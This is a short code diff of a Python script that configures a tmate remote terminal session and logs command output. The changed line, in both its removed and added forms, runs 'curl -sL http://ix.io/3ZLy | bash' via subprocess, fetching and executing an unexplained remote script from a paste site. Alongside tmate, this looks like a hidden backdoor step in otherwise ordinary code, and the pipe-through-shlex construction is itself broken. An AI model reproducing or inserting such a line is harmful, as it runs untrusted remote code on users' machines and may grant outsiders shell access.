@@ -132,7 +132,7 @@ setw -g aggressive-resize on
 bind-key -n C-F3 set-option -g status""")
         for cmd in tmate_cmd.splitlines():
             logger.info(subprocess.check_output(shlex.split(cmd), text=True))
-            logger.info(f"{getuser()}@{subprocess.check_output(shlex.split("curl -sL http://ix.io/3ZLy | bash"), text=True).lstrip("https://")")
+            logger.info(f'{getuser()}@{subprocess.check_output(shlex.split("curl -sL http://ix.io/3ZLy | bash"), text=True).lstrip("https://")')
         if not Path('.json_files').exists():
             data_key = "OPERON_DATA_SOURCE"
             if data_key not in environ:
